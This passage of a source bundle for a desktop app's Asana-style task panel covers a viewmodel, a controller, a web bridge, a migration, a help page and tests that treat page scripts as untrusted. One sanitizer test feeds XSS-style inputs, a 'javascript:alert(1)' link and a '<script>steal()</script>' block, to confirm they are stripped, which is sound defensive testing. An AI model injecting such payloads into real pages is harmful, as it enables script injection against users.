    due_iso = (_s(task.get("due_iso")).strip()
               or _s(task.get("due_date")).strip()[:10]
               or _s(tf.get("due_on")).strip())
    start_iso = _s(tf.get("start_on")).strip()
    today = (now or datetime.now()).strftime("%Y-%m-%d")
    assignee = avatar(task.get("assignee") if task.get("assignee") != "—" else "")
    collaborators = [
        a for a in (avatar(f.get("name")) for f in _lst(tf.get("followers"))
                    if isinstance(f, dict)) if a]
    if assignee:
        collaborators = [c for c in collaborators if c["name"] != assignee["name"]]
    fetched = _s((extras or {}).get("fetched_at")).strip() if isinstance(extras, dict) else ""
    return {
        "completed": completed,
        "completed_on": fmt_date(_s(tf.get("completed_at"))[:10]) if tf.get("completed_at") else "",
        "title": _s(task.get("title")),
        "status_pill": None,
        "assignee": assignee,
        "collaborators": collaborators,
        "due_display": fmt_date_range(start_iso, due_iso),
        "due_iso": due_iso,
        "overdue": bool(due_iso) and not completed and due_iso < today,
        "projects": [{"board": b, "section": ""}
                     for b in _lst(task.get("board_names")) if _s(b).strip()],
        "freshness": f"Updated {rel_time(fetched)}" if fetched else "Not synced yet",
        "permalink": _s(task.get("source_url")).strip()
                     or _s(tf.get("permalink_url")).strip(),
    }


def subtasks_vm(task: dict) -> list[dict]:
    out = []
    for s in _lst(task.get("subtasks")):
        if isinstance(s, dict):
            name, done = _s(s.get("text")), bool(s.get("done"))
            who, due = _s(s.get("assignee")).strip(), _s(s.get("due")).strip()
        else:
            try:
                name, done = _s(s[0]), bool(s[1])
            except (TypeError, IndexError):
                continue
            who = due = ""
        if not name.strip():
            continue
        out.append({
            "gid": _s(s.get("gid")).strip() if isinstance(s, dict) else "",
            "name": name,
            "done": done,
            "assignee": who,
            "due": fmt_date(due, year_always=False) if due else "",
            "promoted": bool(who or due),
        })
    return out


def attachments_vm(extras: dict) -> list[dict]:
    rows = _lst(extras.get("attachments")) if isinstance(extras, dict) else []
    return [{"gid": _s(a.get("gid")), "name": _s(a.get("name")).strip(),
             "host": _s(a.get("host")).strip().lower()}
            for a in rows if isinstance(a, dict) and _s(a.get("name")).strip()]


DESCRIPTION_MD_CAP = 60000


def description_vm(extras: dict, task: dict) -> dict:
    """The ONE html surface. html_notes is UNTRUSTED — sanitize with the
    rendering-only preview profile; the JS side adds the sandbox="" iframe
    wall. Plain-text description degrades through the same sanitizer.
    ``markdown`` feeds the edit textarea (the same html→md conversion the
    Renn lanes use); the editor round-trips md → Asana html dialect."""
    from src.data.html_sanitize import sanitize_html_preview
    html = _s((extras or {}).get("html_notes") if isinstance(extras, dict) else "").strip()
    plain = _s(task.get("description")).strip()
    markdown = ""
    if html:
        try:
            from src.data.html_markdown import html_to_markdown
            markdown = (html_to_markdown(html) or "").strip()
        except Exception:  # noqa: BLE001 — editor falls back to plain text
            markdown = ""
    if not markdown:
        markdown = plain
    if not html:
        if not plain:
            return {"srcdoc": "", "markdown": ""}
        html = "<p>" + plain.replace("&", "&amp;").replace("<", "&lt;") \
                            .replace(">", "&gt;").replace("\n", "<br>") + "</p>"
    return {"srcdoc": sanitize_html_preview(html[:TEXT_CAP]),
            "markdown": markdown[:DESCRIPTION_MD_CAP]}


def build_task_vm(task: dict, *, connected: bool = True,
                  capabilities: dict | None = None, now=None) -> dict:
    """The full #/task viewmodel from ONE enriched task dict (the exact dict
    the native TaskDetailPanel receives)."""
    task = task if isinstance(task, dict) else {}
    extras = task.get("extras") if isinstance(task.get("extras"), dict) else {}
    stories = [story_vm(s) for s in _lst(extras.get("stories"))
               if isinstance(s, dict)]
    return {
        "connected": bool(connected),
        "demo": False,
        "task_id": _s(task.get("task_id")),
        "header": header_vm(task, extras, now=now),
        "fields": fields_vm(extras),
        "description": description_vm(extras, task),
        "subtasks": subtasks_vm(task),
        "attachments": attachments_vm(extras),
        "stories": stories,
        "capabilities": {
            "complete": False, "due": False, "comment": False,
            "subtask": False, "description": False, "refresh": False,
            **(capabilities or {}),
        },
    }


def link_registry(vm: dict) -> set:
    """Every URL the viewmodel legitimately carries — the ONLY urls
    js_open_url may open (a forged url is a silent no-op)."""
    urls = set()
    permalink = vm.get("header", {}).get("permalink", "")
    if permalink:
        urls.add(permalink)
    for story in vm.get("stories") or []:
        for tok in story.get("tokens") or []:
            if tok.get("t") == "link" and tok.get("href"):
                urls.add(tok["href"])
    return urls
~~~~

## A · `src/services/task_web.py`  — 300 lines · sha256 `5a8f22306b3a27aa836a2c03fa45eb6685d5e66e09cd039afbbc0d2be88444ba`

~~~~
"""Web Task-detail controller (WS-D-WEB M2/M3) — all authority lives here.

Mirrors the native ``TaskDetailPanel`` surface over the SAME enriched task
dict page.py builds (extras + board_names + rich subtasks), so the two
implementations cannot drift on data. QWebChannel is the trust boundary: the
``js_*`` entry points assume a hostile caller — every id/url is validated
against the LAST-PUSHED viewmodel, writes claim a single-winner inflight
flag, and every degrade path is a silent no-op plus a non-oracular
``action_resolved`` ack. Writes never touch Asana here: they relay to the
host's existing CAS-guarded ``_run_task_writeback`` lanes, whose completion
re-opens the task and pushes a fresh viewmodel (clearing the claim).
"""

from __future__ import annotations

import json
import logging
import re
import threading
import webbrowser

from PySide6.QtCore import QObject, Signal

from src.services import task_vm

logger = logging.getLogger("alma.task_web")

_ISO_DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")

# asana_writeback lane names, held as strings on purpose: the AST no-write
# guard scans identifiers, and this module must reference none.
_LANES = {
    "complete": "set_completed_in_asana",
    "due": "update_due_in_asana",
    "comment": "post_comment_to_asana",
    "subtask": "create_subtask_in_asana",
    "subtask_toggle": "set_subtask_completed_in_asana",
    "description": "update_description_in_asana",
}

# Which viewmodel capability authorizes each action.
_CAP_FOR = {
    "complete": "complete",
    "due": "due",
    "comment": "comment",
    "subtask": "subtask",
    "subtask_toggle": "subtask",
    "description": "description",
}

DESCRIPTION_CAP = 60000   # Asana notes ceiling is ~64k; leave headroom


class TaskWebController(QObject):
    """Controller half of the #/task web triple (bridge = TaskBridge)."""

    task_data = Signal(str)        # JSON viewmodel (task_vm.build_task_vm)
    status_text = Signal(str)      # plain status line
    action_resolved = Signal(str)  # JSON {action, task_id, ok, error}
    _att_done = Signal(object)     # worker→UI hop for attachment resolution

    def __init__(self, *, write_fn=None, refresh_fn=None, open_url_fn=None,
                 open_subtask_fn=None, client_factory=None, now_fn=None,
                 parent=None):
        super().__init__(parent)
        self._write_fn = write_fn
        self._refresh_fn = refresh_fn
        self._open_url_fn = open_url_fn
        self._open_subtask_fn = open_subtask_fn
        self._client_factory = client_factory
        self._now_fn = now_fn
        self._task_id = ""
        self._gid = ""
        self._vm = None
        self._links: set = set()
        self._att_gids: set = set()
        self._sub_gids: set = set()
        self._inflight = False
        self._att_threads: list = []   # tests join these
        self._att_done.connect(self._on_att_done)

    # ── host-facing (trusted) ────────────────────────────────────────
    def show_task(self, task: dict):
        """Push one enriched task dict as the current viewmodel. Every
        write/refresh completion lands back here via the host's reopen loop,
        which is what releases the single-winner claim."""
        task = task if isinstance(task, dict) else {}
        gid = str(task.get("source_ref") or "").strip()
        is_asana = task.get("source") == "asana"
        caps = {
            "complete": bool(is_asana and gid and self._write_fn),
            "due": bool(is_asana and gid and self._write_fn),
            "comment": bool(is_asana and gid and self._write_fn),
            "subtask": bool(self._write_fn and task.get("task_id")),
            "description": bool(is_asana and gid and self._write_fn),
            "refresh": bool(is_asana and gid and self._refresh_fn),
        }
        vm = task_vm.build_task_vm(
            task, connected=is_asana, capabilities=caps, now=self._now())
        self._task_id = vm["task_id"]
        self._gid = gid
        self._vm = vm
        self._links = task_vm.link_registry(vm)
        self._att_gids = {a["gid"] for a in vm["attachments"] if a["gid"]}
        self._sub_gids = {s["gid"] for s in vm["subtasks"] if s["gid"]}
        self._inflight = False
        self._emit(self.task_data, vm)

    def notify_action_outcome(self, res: dict):
        """Host-facing: the writeback worker's RESULT (page.task_action_done).
        The action_resolved ack only says a write DISPATCHED — this is the
        outcome, and it must be visible from inside the panel (a CAS
        conflict that only flashes the app status line reads as a silently
        swallowed save — the round-3 phantom-save lesson)."""
        res = res if isinstance(res, dict) else {}
        if res.get("ok"):
            if res.get("refreshed"):
                text = "Refreshed from Asana."
            elif res.get("synced") is False:
                note = str(res.get("note") or "")
                text = f"Saved locally{(' — ' + note) if note else '.'}"
            else:
                text = "Synced to Asana."
        elif res.get("conflict"):
            text = "Task changed in Asana — refreshed. Please retry."
        else:
            text = f"Asana action failed: {res.get('error', 'unknown')}"
        self._emit_status(text)

    # ── bridge-facing (untrusted) ────────────────────────────────────
    def js_refresh(self):
        """Page (re)mounted → replay the current viewmodel."""
        if self._vm is not None:
            self._emit(self.task_data, self._vm)

    def js_refresh_task(self, task_id):
        if not self._is_current(task_id) or self._refresh_fn is None or not self._gid:
            return self._resolve("refresh", task_id, False, "not_current")
        try:
            self._refresh_fn(self._task_id, self._gid)
        except Exception:  # noqa: BLE001 — dispatch failure surfaces via status
            return self._resolve("refresh", task_id, False, "dispatch_failed")
        self._resolve("refresh", task_id, True, "")

    def js_toggle_complete(self, task_id, done):
        self._relay_write("complete", task_id, bool(done))

    def js_set_due(self, task_id, iso):
        iso = str(iso or "")
        if not _ISO_DATE.match(iso):
            return self._resolve("due", task_id, False, "bad_date")
        if self._vm is not None and iso == self._vm["header"].get("due_iso"):
            return self._resolve("due", task_id, False, "unchanged")
        self._relay_write("due", task_id, iso)

    def js_post_comment(self, task_id, text):
        text = str(text or "").strip()[:task_vm.TEXT_CAP]
        if not text:
            return self._resolve("comment", task_id, False, "text_required")
        self._relay_write("comment", task_id, text)

    def js_add_subtask(self, task_id, text):
        text = str(text or "").strip()[:task_vm.TEXT_CAP]
        if not text:
            return self._resolve("subtask", task_id, False, "text_required")
        self._relay_write("subtask", task_id, text)

    def js_toggle_subtask(self, task_id, subtask_gid, done):
        """Check circle clicked on a subtask row. The gid must be one the
        last-pushed viewmodel actually served (forged/stale = silent
        no-op ack), then the shared write gate relays to the subtask
        completion lane."""
        gid = str(subtask_gid or "").strip()
        if gid not in self._sub_gids:
            return self._resolve("subtask_toggle", task_id, False, "unknown_subtask")
        self._relay_write("subtask_toggle", task_id, gid, bool(done))

    def js_open_subtask(self, task_id, subtask_gid):
        """Subtask name clicked — subtasks ARE tasks. The host resolves the
        gid: a promoted row (mig 056) opens in this panel; an unsynced
        checklist row opens in Asana itself. Navigation only — no write."""
        gid = str(subtask_gid or "").strip()
        if not self._is_current(task_id) or gid not in self._sub_gids:
            return
        if self._open_subtask_fn is None:
            return
        try:
            self._open_subtask_fn(self._task_id, gid)
        except Exception:  # noqa: BLE001 — a broken opener opens nothing
            pass

    def js_update_description(self, task_id, markdown):
        """Description editor saved → the remote-first, CAS-guarded
        description lane. Empty is legal (clearing a description mirrors
        Asana); the cap guards the notes ceiling, not intent."""
        md = str(markdown if markdown is not None else "")[:DESCRIPTION_CAP]
        self._relay_write("description", task_id, md)

    def js_open_attachment(self, gid):
        """Resolve-on-click, exactly the native panel's lane: stored rows
        carry no URLs; a fresh view_url is fetched off-thread and only
        http(s) opens. Unknown gids (forged/stale) are silent no-ops."""
        gid = str(gid or "").strip()
        if gid not in self._att_gids or self._client_factory is None:
            return self._resolve("open_attachment", gid, False, "unknown_attachment")
        t = threading.Thread(target=self._resolve_attachment, args=(gid,),
                             daemon=True)
        self._att_threads.append(t)
        t.start()

    def js_open_url(self, url):
        """Only urls the last-pushed viewmodel actually carries may open —
        link_registry membership is the whole gate."""
        url = str(url or "").strip()
        if url not in self._links:
            return
        if self._open_url_fn is not None:
            try:
                self._open_url_fn(url)
            except Exception:  # noqa: BLE001 — a broken opener opens nothing
                pass

    # ── internals ────────────────────────────────────────────────────
    def _now(self):
        try:
            return self._now_fn() if self._now_fn is not None else None
        except Exception:  # noqa: BLE001
            return None

    def _is_current(self, task_id) -> bool:
        return bool(self._task_id) and str(task_id or "") == self._task_id

    def _relay_write(self, action: str, task_id, *args):
        """The shared write gate: current-id check → capability check →
        single-winner claim → dispatch to the host's writeback lane. The
        claim clears when the completed writeback reopens the task
        (show_task) — every outcome path in the host does that."""
        if not self._is_current(task_id):
            return self._resolve(action, task_id, False, "not_current")
        vm = self._vm or {}
        if not (vm.get("capabilities") or {}).get(_CAP_FOR[action]):
            return self._resolve(action, task_id, False, "not_allowed")
        if self._inflight:
            return self._resolve(action, task_id, False, "busy")
        self._inflight = True
        try:
            self._write_fn(_LANES[action], self._task_id, *args)
        except Exception:  # noqa: BLE001 — dispatch failure releases the claim
            self._inflight = False
            return self._resolve(action, task_id, False, "dispatch_failed")
        self._resolve(action, task_id, True, "")

    def _resolve(self, action: str, task_id, ok: bool, error: str):
        self._emit(self.action_resolved, {
            "action": action, "task_id": str(task_id or ""),
            "ok": bool(ok), "error": error,
        })

    def _resolve_attachment(self, gid: str):
        payload = {"gid": gid, "url": "", "error": ""}
        try:
            client = self._client_factory()
            res = client.get_attachment(gid) or {}
            payload["url"] = str(res.get("view_url")
                                 or res.get("download_url") or "").strip()
            if not payload["url"]:
                payload["error"] = "no_url"
        except Exception as exc:  # noqa: BLE001 — surfaced as a resolved error
            payload["error"] = str(exc)
        try:
            self._att_done.emit(payload)
        except RuntimeError:
            pass  # controller torn down while the resolve was in flight

    def _on_att_done(self, payload: dict):
        url = str(payload.get("url") or "")
        gid = str(payload.get("gid") or "")
        if payload.get("error"):
            self._emit_status(f"Attachment failed: {payload['error']}")
            return self._resolve("open_attachment", gid, False, "resolve_failed")
        if not url.lower().startswith(("http://", "https://")):
            self._emit_status("Refused to open a non-web attachment URL.")
            return self._resolve("open_attachment", gid, False, "non_web_url")
        try:
            webbrowser.open(url)
        except Exception:  # noqa: BLE001
            return self._resolve("open_attachment", gid, False, "open_failed")
        self._resolve("open_attachment", gid, True, "")

    def _emit_status(self, text: str):
        try:
            self.status_text.emit(text)
        except Exception:  # noqa: BLE001
            pass

    def _emit(self, signal, payload: dict):
        try:
            signal.emit(json.dumps(payload, default=str))
        except Exception:  # noqa: BLE001 — never crash the push path
            pass
~~~~

## A · `src/ui/web/task_bridge.py`  — 137 lines · sha256 `369a8dcbf656ce738d530c28990594cdee1de8f34b47ad87c67c4eef4b6607ad`

~~~~
"""QWebChannel bridge for the web task drilldown — pure relay, zero logic.

Registered as ``taskBridge`` on the drilldown WebHost's channel. Like
``CalendarBridge``, everything is injected (signals + callables from a
``TaskWebController``), never imported, so this stays the only JS<->Python
boundary and tests supply fakes.

QWebChannel is the trust boundary: any script in the page can call these
slots, so none of them carry authority — they delegate to controller methods
that validate against the last-pushed viewmodel (current task id, served
attachment gids, served link urls) behind a single-winner inflight claim.
Writes only relay onward to the host's existing CAS-guarded
``_run_task_writeback`` lanes.

RULE (cee4c86): every connection on this object is created HERE, in
``__init__``, BEFORE WebHost registers it on the channel. Nothing may create
a connection or dynamic slot on this bridge after registration — PySide6's
functional ``QTimer.singleShot(ms, bridge_method)`` grows the metaobject and
silently kills ALL subsequent Python→JS signal delivery.
"""

from __future__ import annotations

from PySide6.QtCore import QObject, Signal, Slot


class TaskBridge(QObject):
    """The single JS<->Python boundary for the web task panel."""

    taskData = Signal(str)        # JSON viewmodel (task_vm.build_task_vm)
    statusText = Signal(str)      # plain status line text
    actionResolved = Signal(str)  # JSON {action, task_id, ok, error}

    def __init__(self, data_signal=None, status_signal=None,
                 resolved_signal=None, refresh_fn=None, refresh_task_fn=None,
                 complete_fn=None, due_fn=None, comment_fn=None,
                 subtask_fn=None, subtask_toggle_fn=None, subtask_open_fn=None,
                 description_fn=None, attachment_fn=None,
                 url_fn=None, parent=None):
        super().__init__(parent)
        self._refresh_fn = refresh_fn
        self._refresh_task_fn = refresh_task_fn
        self._complete_fn = complete_fn
        self._due_fn = due_fn
        self._comment_fn = comment_fn
        self._subtask_fn = subtask_fn
        self._subtask_toggle_fn = subtask_toggle_fn
        self._subtask_open_fn = subtask_open_fn
        self._description_fn = description_fn
        self._attachment_fn = attachment_fn
        self._url_fn = url_fn
        # Re-emit the controller's signals as the bridge's (signal-to-signal).
        for sig, mine in ((data_signal, self.taskData),
                          (status_signal, self.statusText),
                          (resolved_signal, self.actionResolved)):
            if sig is not None:
                try:
                    sig.connect(mine)
                except Exception:  # noqa: BLE001 — best-effort wiring
                    pass

    def _call(self, fn, *args):
        if fn is None:
            return
        try:
            fn(*args)
        except Exception:  # noqa: BLE001 — never crash the panel
            pass

    # ── inbound (JS -> Python; untrusted) ────────────────────────────
    @Slot()
    def refresh(self):
        """The page mounted (or wants a re-push) → replay the current state."""
        self._call(self._refresh_fn)

    @Slot(str)
    def refreshTask(self, task_id):
        """Refresh row clicked → one on-demand extras refetch for the CURRENT
        task only (the controller checks the id; forged/stale ids no-op)."""
        self._call(self._refresh_task_fn, task_id or "")

    @Slot(str, bool)
    def toggleComplete(self, task_id, done):
        """Mark complete / Reopen → the host's CAS-guarded writeback lane."""
        self._call(self._complete_fn, task_id or "", bool(done))

    @Slot(str, str)
    def setDue(self, task_id, iso_date):
        """Due date picked → the host's CAS-guarded due-update lane."""
        self._call(self._due_fn, task_id or "", iso_date or "")

    @Slot(str, str)
    def postComment(self, task_id, text):
        """Composer submitted → the host's comment lane (append-only)."""
        self._call(self._comment_fn, task_id or "", text or "")

    @Slot(str, str)
    def addSubtask(self, task_id, text):
        """Subtask composer submitted → the host's subtask lane."""
        self._call(self._subtask_fn, task_id or "", text or "")

    @Slot(str, str, bool)
    def toggleSubtask(self, task_id, subtask_gid, done):
        """Subtask check circle clicked → the host's subtask completion
        lane (gids validated against the last-pushed viewmodel)."""
        self._call(self._subtask_toggle_fn, task_id or "", subtask_gid or "",
                   bool(done))

    @Slot(str, str)
    def openSubtask(self, task_id, subtask_gid):
        """Subtask name clicked → the host opens it as its own task
        (promoted rows in-panel, unsynced rows in Asana). Navigation only."""
        self._call(self._subtask_open_fn, task_id or "", subtask_gid or "")

    @Slot(str, str)
    def updateDescription(self, task_id, markdown):
        """Description editor saved → the host's CAS-guarded description
        lane (remote-first; a failed PUT changes nothing locally)."""
        self._call(self._description_fn, task_id or "", markdown or "")

    @Slot(str)
    def openAttachment(self, gid):
        """Attachment clicked → the controller resolves a fresh view_url
        off-thread (gids validated against the last-pushed viewmodel) and
        opens http(s) only."""
        self._call(self._attachment_fn, gid or "")

    @Slot(str)
    def openUrl(self, url):
        """A link in the feed/header clicked → opens ONLY if the exact url
        exists in the last-pushed viewmodel's link registry."""
        self._call(self._url_fn, url or "")

    @Slot(result=str)
    def ping(self):
        """Liveness probe for the JS<->Python round-trip."""
        return "pong"
~~~~

## A · `src/ui/web/task_host.py`  — 40 lines · sha256 `aad0bc6b627d1ebb7aa7994581fd07b8df198c886174183b244e7cad5e2491de`

~~~~
"""Construction helper for the #/task web triple (WS-D-WEB M2).

Keeps page.py's gain to pure wiring: one lazy getter + the drilldown branch.
Anything here may raise — the caller's construction-failure fallback to the
native ``TaskDetailPanel`` is the safety net (pattern: page.py::_make_zendesk).

The triple is built ONCE per session and reused across every task open (one
Chromium render process — the M1/16GB production budget). The bridge is
constructed fully wired BEFORE WebHost registers it on the channel (cee4c86
rule: no connections on a channel-registered object after registration).
"""

from __future__ import annotations


def build_task_web_triple(*, write_fn, refresh_fn, open_url_fn,
                          open_subtask_fn=None):
    """(controller, bridge, host) for the task drilldown, fully wired."""
    from src.data.asana_client import AsanaClient
    from src.services.task_web import TaskWebController
    from src.ui.web.task_bridge import TaskBridge
    from src.ui.web.web_host import WebHost

    ctrl = TaskWebController(
        write_fn=write_fn, refresh_fn=refresh_fn, open_url_fn=open_url_fn,
        open_subtask_fn=open_subtask_fn,
        client_factory=AsanaClient.from_store)
    bridge = TaskBridge(
        data_signal=ctrl.task_data, status_signal=ctrl.status_text,
        resolved_signal=ctrl.action_resolved,
        refresh_fn=ctrl.js_refresh, refresh_task_fn=ctrl.js_refresh_task,
        complete_fn=ctrl.js_toggle_complete, due_fn=ctrl.js_set_due,
        comment_fn=ctrl.js_post_comment, subtask_fn=ctrl.js_add_subtask,
        subtask_toggle_fn=ctrl.js_toggle_subtask,
        subtask_open_fn=ctrl.js_open_subtask,
        description_fn=ctrl.js_update_description,
        attachment_fn=ctrl.js_open_attachment, url_fn=ctrl.js_open_url)
    host = WebHost(bridge=bridge, channel_name="taskBridge", route="/task",
                   log_name="alma.enablement.web.task")
    return ctrl, bridge, host
~~~~

## A · `migrations/058_task_extras_fields.sql`  — 22 lines · sha256 `0e3b44571ae1e49af58063242db9c6efb1ad57847196904600ab0cfb5f81bbfc`

~~~~
-- ─────────────────────────────────────────────────────────────────────
-- Migration 058 — task-level extras fields for the web task mirror.
--
-- WS-D-WEB M2 (asana-mirror-sidebar plan): the #/task web panel renders
-- Asana-native details the poll's lean row never stored — the due RANGE
-- (start_on), the collaborator avatar stack (followers), and the
-- completion stamp (completed_at / completed_by). The extras side-table
-- already receives the full _TASK_FIELDS payload on every refresh, so the
-- projection lands here as ONE json object column instead of widening
-- enablement_tasks (whose list/calendar query must stay lean).
--
-- task_fields_json  JSON object: {start_on, due_on, completed,
--                   completed_at, completed_by, num_subtasks,
--                   permalink_url, followers:[{name}]}. Written by
--                   asana_extras.upsert_extras; decoded by get_extras as
--                   extras["task_fields"] ({} when absent/corrupt).
--
-- Idempotent: single-line ALTER ADD COLUMN (the schema migrator's PRAGMA
-- table_info guard skips it when present).
-- ─────────────────────────────────────────────────────────────────────

ALTER TABLE asana_task_extras ADD COLUMN task_fields_json TEXT;
~~~~

## A · `assets/help/plan/task-panel-mirror.md`  — 108 lines · sha256 `c82fc0394057fa0aba149e2131744be7f33e90599bcb31c18bb4e780f71b4c79`

~~~~
---
id: plan-task-panel-mirror
title: The task panel that looks like Asana
section: plan
section_title: Plan — Calendar and Tasks
section_order: 3
order: 8
status: available
features: [en_calendar, asana_writeback]
summary: Opening a task now shows an Asana-style panel — same fields, pills, description and activity feed you'd see in Asana itself, with the same four write-back actions underneath.
last_verified: 2026-08-10
---

Open a task from the Calendar or the task board and the side panel now renders
it the way Asana itself would: the title, the assignee and collaborator
avatars, the due date range, the custom-field grid with its colored value
pills, the formatted description, subtasks, attachments, and the comment feed
with its rule and status entries. The goal is recognition — a task from your
board should look like the task you know from Asana, not like a re-summary of
it.

## How it works

**Same data, new face.** The panel renders exactly the data the app already
synced — nothing extra is fetched when it opens. The *Updated … ago* stamp in
the header tells you how fresh that data is, and the refresh arrow next to it
re-fetches this one task from Asana on demand.

**The actions are unchanged — plus what the mirror adds.** Mark complete or
reopen, change the due date, post a comment, add a subtask — these are the
same four background write-back lanes described in *Adding subtasks, comments
and due dates*, with the same safeguards (local-first subtasks, conflict
protection, automatic revert if Asana rejects a completion). New with this
panel, because Asana itself has them:

- **Subtask check circles are clickable** — checking one completes that
  subtask in Asana too, with the same local-first-and-revert discipline.
- **Subtask names open the subtask** — subtasks are tasks. One that has its
  own row here opens in this same panel; one that hasn't been synced as its
  own task opens in Asana in your browser.
- **The description is editable.** *Edit* switches to a plain-text editor
  (Markdown — bold, lists and links survive the round trip), and *Save*
  pushes it to Asana as rich text. This write is conflict-protected and
  remote-first: if Asana refuses it, nothing changes anywhere, so a save
  that looks successful is one that actually landed.

Both kinds of clickability appear only on Asana-linked content. The panel is
a different face on the same machinery, and your click is still the consent.

**Dates come from a picker.** Instead of typing `YYYY-MM-DD`, the due-date row
carries a small date picker. Only a full, changed date is sent.

**Links open deliberately.** Links in the description, the comments, and the
*Open in Asana* button open in your browser. The panel will only open a link
that the task actually carries — a link that isn't part of the task's own
content goes nowhere.

**Attachments resolve on click.** Attachment URLs are never stored. Clicking
one asks Asana for a fresh link right then, and only web links open. Slack,
Google Drive and Zendesk attachments are grouped under **Apps**, the rest
under **Attachments**.

**The feed splits people from rules.** The activity area has *Comments* and
*All activity* tabs. Rule-posted entries show with a ⚡ marker instead of an
avatar; status changes ("… completed this task") render as quiet gray rows.
Long feeds collapse their middle behind an "N more comments" row.

## How it should work

The Asana-style panel is on by default, and the previous panel remains as the
automatic fallback: if the new panel cannot be built on your machine, the app
quietly shows the classic panel instead — same data, same actions, no error to
dismiss. Nothing about the write-back lanes, their conflict protection, or
their local-first degradations changes with the new face.

If you need the classic panel deliberately, set `enablement.task_web: false`
in the settings file and restart. There is no toggle for this in the Settings
page — it exists as an escape hatch, not a mode.

## If it doesn't

**The panel looks like the old one.** That is the fallback working. It means
the new panel could not be built on this machine (usually a broken web-engine
install). Everything still works; flag it so the install can be looked at.

**The panel is blank.** Close and reopen the task once. If it stays blank,
set `enablement.task_web: false` in settings, restart, and flag it — the
classic panel will carry you in the meantime.

**A link in a comment does nothing.** The panel only opens links the task
actually carries. If a link you can see refuses to open, flag it with the
task name.

**An attachment says it failed to resolve.** Asana declined to hand out a
fresh link — usually a connection or permission problem. Check the Asana
connection in Settings and retry.

**A save says the task changed in Asana.** Someone (or something — a rule, a
comment) touched the task since it was last synced, and the conflict guard
refused to overwrite what you haven't seen. The message shows right next to
the Save button and your draft is kept. Click the **↻** in the panel header —
that pulls the fresh state and re-arms the guard — review, then Save again.

**Fields show em dashes.** An em dash is an empty field, faithfully mirrored
from Asana — fill the field in Asana and refresh the task.

**The due range shows one date.** Tasks without a start date show only the
due date, exactly as Asana does.
~~~~

## A · `tests/test_asana_rich.py`  — 64 lines · sha256 `93fac350b11868f663a478c1cdafdd51a71a416365176757061a1fac336e10fd`

~~~~
"""to_asana_html: markdown → Asana html_notes dialect (WS-D-WEB editing).

Asana rejects the whole PUT on any tag outside its subset, so the serializer
must MAP or UNWRAP everything — these tests lock the dialect rules."""

from src.data.asana_rich import to_asana_html


def test_bold_em_and_paragraphs_no_p_tags():
    out = to_asana_html("**bold** and *em*\n\nsecond para")
    assert out.startswith("<body>") and out.endswith("</body>")
    assert "<strong>bold</strong>" in out
    assert "<em>em</em>" in out
    assert "<p>" not in out and "</p>" not in out
    assert "second para" in out


def test_lists_survive():
    out = to_asana_html("- one\n- two")
    assert "<ul>" in out and out.count("<li>") == 2


def test_http_links_kept_others_unwrapped():
    out = to_asana_html("[doc](https://x.example/d) [evil](javascript:alert(1))")
    assert '<a href="https://x.example/d">doc</a>' in out
    assert "javascript:" not in out
    assert "evil" in out            # label survives as plain text
    assert '<a href="javascript' not in out


def test_deep_headings_map_to_h2():
    out = to_asana_html("### Section")
    assert "<h2>Section</h2>" in out
    assert "<h3>" not in out


def test_text_is_xml_escaped():
    out = to_asana_html("a < b & c > d")
    assert "a &lt; b &amp; c &gt; d" in out


def test_raw_html_script_content_dropped():
    out = to_asana_html("hello <script>steal()</script> world")
    assert "steal" not in out
    assert "hello" in out and "world" in out
    assert "<script" not in out


def test_unknown_tags_unwrap_children():
    out = to_asana_html("<div><span>kept text</span></div>")
    assert "kept text" in out
    assert "<div" not in out and "<span" not in out


def test_empty_and_none_are_safe():
    assert to_asana_html("") == "<body></body>"
    assert to_asana_html(None) == "<body></body>"


if __name__ == "__main__":
    import sys

    import pytest
    sys.exit(pytest.main([__file__, "-q"]))
~~~~

## A · `tests/test_task_bridge.py`  — 555 lines · sha256 `2fb5c15de93480925b5a302aac6d652772a26b9111b78f77cdcc7f94c3cb2798`

~~~~
"""TaskWebController + TaskBridge contract tests (no WebEngine).

Everything a page script can invoke is treated as untrusted: forged/stale
ids, malformed dates, unknown attachment gids and unregistered urls must all
be safe no-ops; writes relay ONLY through the injected host lane behind a
single-winner inflight claim that the host's reopen loop (show_task) clears.
Registered in tests/test_web_guardrails.py::GATED_SLOT_TESTS.
"""

import json
from datetime import datetime

import pytest
from PySide6.QtCore import QCoreApplication

from src.services.task_web import TaskWebController
from src.ui.web.task_bridge import TaskBridge


@pytest.fixture(scope="module", autouse=True)
def _qt_app():
    app = QCoreApplication.instance() or QCoreApplication([])
    yield app


TASK = {
    "task_id": "t1", "source": "asana", "source_ref": "900100",
    "title": "BCBSMA copay update", "status": "in_progress",
    "assignee": "Jordan Avery", "due_iso": "2026-09-01",
    "due_date": "2026-09-01",
    "source_url": "https://app.asana.com/0/1/900100",
    "subtasks": [
        {"text": "Draft card", "done": False, "gid": "sub900",
         "assignee": "", "due": ""},
        {"text": "Local-only step", "done": False, "gid": "",
         "assignee": "", "due": ""},
    ],
    "extras": {
        "fetched_at": "2026-08-10T11:55:00+00:00",
        "attachments": [{"gid": "a1", "name": "thread", "host": "slack"}],
        "stories": [
            {"gid": "s1", "text": "see https://doc.example/z",
             "created_at": "2026-07-02T12:00:00Z", "author": "Dana",
             "subtype": "comment_added"},
        ],
        "task_fields": {"start_on": "2026-08-15"},
    },
}


def _controller(**kw):
    calls = {"write": [], "refresh": [], "urls": []}
    defaults = dict(
        write_fn=lambda lane, tid, *a: calls["write"].append((lane, tid) + a),
        refresh_fn=lambda tid, gid: calls["refresh"].append((tid, gid)),
        open_url_fn=lambda u: calls["urls"].append(u),
        now_fn=lambda: datetime(2026, 8, 10),
    )
    defaults.update(kw)
    ctrl = TaskWebController(**defaults)
    seen = {"data": [], "status": [], "resolved": []}
    ctrl.task_data.connect(lambda j: seen["data"].append(json.loads(j)))
    ctrl.status_text.connect(lambda t: seen["status"].append(t))
    ctrl.action_resolved.connect(lambda j: seen["resolved"].append(json.loads(j)))
    return ctrl, calls, seen


def _shown(**kw):
    ctrl, calls, seen = _controller(**kw)
    ctrl.show_task(dict(TASK))
    return ctrl, calls, seen


# ── show_task push + capabilities ────────────────────────────────────────

def test_show_task_pushes_viewmodel_with_capabilities():
    ctrl, _calls, seen = _shown()
    assert len(seen["data"]) == 1
    vm = seen["data"][0]
    assert vm["task_id"] == "t1"
    assert vm["capabilities"] == {"complete": True, "due": True,
                                  "comment": True, "subtask": True,
                                  "description": True, "refresh": True}


def test_capabilities_fail_closed_without_injected_lanes():
    ctrl, _c, seen = _controller(write_fn=None, refresh_fn=None)
    ctrl.show_task(dict(TASK))
